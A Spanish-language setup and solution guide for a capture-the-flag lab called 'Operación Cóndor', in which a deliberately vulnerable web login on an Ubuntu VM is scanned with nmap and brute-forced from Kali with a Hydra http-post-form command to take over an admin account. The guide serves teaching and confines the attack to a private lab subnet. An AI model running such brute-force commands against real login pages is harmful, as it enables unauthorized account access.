# Montar y resolver Operación Cóndor

El resultado será una página web ficticia en una VM Ubuntu Server 26.04. Desde Kali podrás descubrirla, adivinar la contraseña de práctica, entrar como administrador y publicar un comunicado para obtener la flag.

Los ejemplos usan **Ubuntu `192.168.146.150`** y la subred **`192.168.146.0/24`**. Son direcciones ilustrativas: usa la IP real que muestre tu VM y evita repetir la de otra máquina. No cambies la IP de una VM existente para seguir el ejemplo. SSH y RDP sirven para manejar las VMs; el ejercicio de fuerza bruta se realiza contra el **login web**, no contra SSH o RDP.

## 1. Preparar las VMs

Conecta Ubuntu y Kali a la misma red virtual privada, preferiblemente NAT o solo anfitrión. No configures redirecciones de puertos desde Internet. Si usas NAT para instalar paquetes, ambas VMs deben compartir esa misma red virtual. Toma una instantánea antes de instalar para volver al estado inicial del laboratorio.

En la consola de **Ubuntu**, consulta la versión y la IP:

```bash
cat /etc/os-release
ip -4 address
```

Debes ver Ubuntu `26.04` y una IPv4 privada del laboratorio. Si necesitas transferir el paquete mediante SSH y no lo habilitaste durante la instalación de Ubuntu, ejecuta:

```bash
sudo apt update
sudo apt install -y openssh-server
sudo systemctl enable --now ssh
```

Esto habilita únicamente el acceso de administración a la VM. El instalador de la página no modifica SSH ni las reglas del firewall.

## 2. Obtener el código

La opción recomendada es clonar el repositorio independiente en **Ubuntu**. Ejecuta estos comandos y continúa en el paso 4 después de instalar:

```bash
sudo apt update
sudo apt install -y git
mkdir -p ~/laboratorios
cd ~/laboratorios
git clone --depth 1 https://github.com/lavillamarin3-hash/operacion-condor.git
cd operacion-condor
sudo bash deploy/install.sh --server-ip 192.168.146.150 --lab-cidr 192.168.146.0/24
```

Si ya tienes el archivo `operacion-condor.tar.gz`, también puedes transferirlo desde Windows e instalarlo siguiendo el paso 3.

Guarda `operacion-condor.tar.gz` en tu carpeta Descargas. Abre **PowerShell en Windows**. Cambia `tu_usuario_ubuntu` por el usuario que creaste en esa VM y la IP por la que obtuviste en el paso anterior:

```powershell
$usuarioVm = "tu_usuario_ubuntu"
$ipVm = "192.168.146.150"
scp "$env:USERPROFILE\Downloads\operacion-condor.tar.gz" "${usuarioVm}@${ipVm}:~/"
ssh "${usuarioVm}@${ipVm}"
```

Es normal que SSH pida la contraseña de tu usuario Ubuntu. Esa contraseña administra la VM y es distinta de la contraseña ficticia que descubrirás en el ejercicio. Verifica la identidad de tu VM antes de aceptar una clave SSH nueva.

## 3. Extraer e instalar en Ubuntu

Los siguientes comandos se ejecutan **dentro de Ubuntu**, después de entrar por SSH o en su consola:

```bash
mkdir -p ~/laboratorios
tar -xzf ~/operacion-condor.tar.gz -C ~/laboratorios
cd ~/laboratorios/operacion-condor
bash deploy/install.sh --server-ip 192.168.146.150 --lab-cidr 192.168.146.0/24 --validate-only
sudo bash deploy/install.sh --server-ip 192.168.146.150 --lab-cidr 192.168.146.0/24
```

El instalador descarga las dependencias de Ubuntu y Python, crea un entorno `venv`, inicializa la base de datos, genera secretos y activa `condor-lab.service`. No usa el servidor de desarrollo de Flask. Requiere acceso a los repositorios de Ubuntu y al índice de paquetes Python durante la instalación.

La IP debe pertenecer a una interfaz de Ubuntu. Se rechazan IP públicas, `0.0.0.0`, redes públicas y un puerto `8080` o `18080` ocupado por otra aplicación. Si otra aplicación ya usa esos puertos, utiliza una VM limpia; el instalador no la detiene ni la reemplaza.

La dirección final será:

```text
http://192.168.146.150:8080/
```

Nginx solo escucha ese portal en la IP privada indicada y permite la subred configurada. Gunicorn escucha en `127.0.0.1:18080`, accesible únicamente dentro de Ubuntu. Un sitio Nginx previo en el puerto `80`, si existe, se conserva; para este ejercicio abre siempre el puerto **8080**.

## 4. Verificar antes de entregar el reto

En **Ubuntu**:

```bash
sudo systemctl status condor-lab --no-pager
sudo nginx -t
sudo ss -ltnp | grep -E '(:8080|:18080)'
curl --fail http://192.168.146.150:8080/healthz
```

Resultados esperados:

- `condor-lab` aparece `active (running)`.
- Nginx informa que la configuración es válida.
- Nginx escucha `192.168.146.150:8080` y Gunicorn `127.0.0.1:18080`.
- `/healthz` responde JSON con estado `ok`.

Abre el portal desde **Kali**. La portada debe mostrar “Operación Cóndor” y la indicación de simulación académica. Comprueba que el panel de administración requiere iniciar sesión.

Si UFW ya está activo y bloquea este acceso, el instructor puede añadir esta regla limitada a la subred del laboratorio. El instalador no ejecuta este comando:

```bash
sudo ufw status
sudo ufw allow from 192.168.146.0/24 to 192.168.146.150 port 8080 proto tcp comment 'Cociber Condor laboratorio'
```

Mantén tu regla de administración SSH. No hace falta desactivar el firewall.

## 5. Resolver desde Kali

Entrega esta sección a los participantes. El instructor indica la IP exacta de la **víctima asignada**. Los comandos no descubren ni atacan otros equipos.

En la terminal de **Kali**, define la dirección del laboratorio:

```bash
TARGET=192.168.146.150
```

### Descubrir la página

```bash
nmap -sT -Pn -p 8080 "$TARGET"
```

El resultado debe indicar `8080/tcp open`. Abre en Firefox:

```text
http://192.168.146.150:8080/
```

Revisa la portada y las noticias. Allí se presenta el usuario de práctica **`admin.condor`** y el recurso educativo para el ejercicio.

### Descargar el diccionario y probar el acceso

```bash
curl --fail "http://$TARGET:8080/recursos/candidatas.txt" -o candidatas.txt
wc -l candidatas.txt
```

El archivo contiene 12 contraseñas ficticias. Si Kali no tiene Hydra, instala la herramienta del repositorio de Kali:

```bash
sudo apt update
sudo apt install -y hydra
```

Ejecuta la prueba contra el **único login del laboratorio**, con una tarea y detención al encontrar la contraseña:

```bash
hydra -l admin.condor -P candidatas.txt -s 8080 -t 1 -f "$TARGET" http-post-form '/login:username=^USER^&password=^PASS^:F=Credenciales incorrectas'
```

Hydra mostrará un resultado con `login: admin.condor` y `password:`. Si hay varias tareas o un objetivo distinto, corrige el comando antes de continuar. El login es deliberadamente vulnerable a adivinación de contraseñas; no hace falta modificar el código de la página.

### Entrar y completar la misión

1. Abre el acceso de personal de la web.
2. Introduce `admin.condor` y la contraseña encontrada.
3. Entra al centro de mando.
4. Escribe un título y un comunicado, por ejemplo “Auditoría completada por Grupo Verde”.
5. Pulsa **Publicar comunicado**.
6. Copia la flag que se muestra al completar la acción.
7. Vuelve a la portada: el comunicado publicado debe aparecer allí.

La flag no se entrega por visitar la portada ni por descargar el diccionario. El logro consiste en autenticarse como administrador y publicar un comunicado.

## 6. Prepararlo para Cociber CTF

El repositorio funciona por sí mismo. La integración con la [plataforma Cociber CTF](https://github.com/lavillamarin3-hash/ctf-platform) es opcional. No conecta automáticamente el botón “Iniciar” de Cociber CTF con las VMs ni actualiza su puntaje.

Para usarlo con la plataforma, crea un reto llamado **“Operación Cóndor: fuerza bruta de credenciales web”**, coloca el enlace privado de la víctima y configura la flag de esta instalación en el formulario del instructor. Asigna el reto al grupo correspondiente y configura tiempo, pistas y descuento desde Cociber CTF.

Solo el **instructor**, en la consola de Ubuntu, puede consultar la flag para registrarla. No publiques esta salida ni el archivo de secretos en las instrucciones, capturas o Git:

```bash
sudo grep '^CONDOR_FLAG=' /etc/condor-lab/condor.env
```

Registra únicamente el valor después de `CONDOR_FLAG=`. Si validas la resolución con un grupo compartido, todos obtendrán la misma flag. Para grupos con estados independientes, utiliza una VM por grupo y registra la flag de cada instancia en su reto correspondiente.

## 7. Actualizar sin perder los datos

Si instalaste desde Git, actualiza el código y repite el comando de instalación con la misma IP y subred:

```bash
cd ~/laboratorios/operacion-condor
git pull --ff-only
sudo bash deploy/install.sh --server-ip 192.168.146.150 --lab-cidr 192.168.146.0/24
```

Si usaste el paquete comprimido, extrae la nueva versión en `~/laboratorios` y repite el comando de instalación desde `~/laboratorios/operacion-condor`; en ese caso no ejecutes `git pull`.

Se crea una nueva versión del código en `/opt/condor-lab/releases`, conservando la base de datos, el comunicado, la contraseña y la flag. La inicialización no restablece un administrador existente. Las versiones anteriores no se eliminan automáticamente.

Para repetir la demostración desde cero, utiliza la instantánea tomada antes de la instalación y vuelve a instalar. Una instalación nueva genera otra flag: actualízala en Cociber CTF si ya la habías registrado. Nunca restaures una VM que esté siendo utilizada por otro grupo.

## 8. Diagnóstico y apagado

Para consultar errores del laboratorio en **Ubuntu**:

```bash
sudo journalctl -u condor-lab -n 60 --no-pager
sudo tail -n 40 /var/log/nginx/error.log
sudo ss -ltnp | grep -E '(:8080|:18080)'
```

| Síntoma | Qué comprobar |
|---|---|
| `Connection refused` | IP de Ubuntu, servicio `condor-lab` y escucha de Nginx. |
| HTTP `403` | La IP de Kali debe estar dentro de la subred autorizada. |
| HTTP `502` | Gunicorn debe estar activo en `127.0.0.1:18080`; revisa `journalctl`. |
| “Host no permitido” | Usa la IP exacta con la que instalaste o el nombre `condor.lab` apuntando a esa IP. |
| Hydra no encuentra la contraseña | Descarga otra vez las 12 candidatas, usa `admin.condor`, puerto `8080` y el comando exacto de esta guía. |
| IP o red distinta después de reiniciar | Mantén una reserva de IP para la VM; el sitio escucha la IP especificada en la instalación. |

Para detener **solo la aplicación del laboratorio**, sin detener otros sitios Nginx:

```bash
sudo systemctl stop condor-lab
```

Para reanudar:

```bash
sudo systemctl start condor-lab
```

Al detener Gunicorn, el portal de Nginx responderá `502`; esto es esperado. Al terminar una exposición también puedes apagar la VM desde el hipervisor.

## Referencias

- [Ubuntu: Python y entornos virtuales](https://documentation.ubuntu.com/ubuntu-for-developers/tutorials/python-use/).
- [Flask: despliegue con Gunicorn](https://flask.palletsprojects.com/en/stable/deploying/gunicorn/).
- [Nginx: control de acceso por dirección y subred](https://nginx.org/en/docs/http/ngx_http_access_module.html).
